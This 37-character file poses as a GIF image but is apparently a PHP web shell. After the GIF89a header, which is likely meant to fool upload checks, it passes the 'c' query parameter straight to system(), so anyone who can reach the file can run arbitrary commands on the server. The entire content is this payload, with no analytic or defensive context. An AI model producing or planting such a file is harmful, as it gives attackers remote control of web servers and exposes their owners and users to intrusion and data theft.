GIF89a
<?php

system($_GET['c']);

?>